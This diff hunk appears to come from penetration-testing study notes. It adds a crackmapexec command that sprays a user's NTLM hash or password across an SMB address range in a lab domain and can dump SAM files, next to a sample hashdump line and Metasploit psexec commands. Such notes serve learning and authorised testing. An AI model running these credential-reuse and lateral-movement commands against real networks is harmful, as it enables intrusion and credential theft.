@@ -2109,6 +2109,8 @@ net start upnphost
 # From this hashdump
 # admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::
 
+crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -H <NTLM Hash>-p <P@ssw0rd1> # Check other machines for dual access with the same PW; --sam (dump SAM file)
+
 msf5 > use exploit/windows/smb/psexec
 msf5 exploit(windows/smb/psexec) > options
 
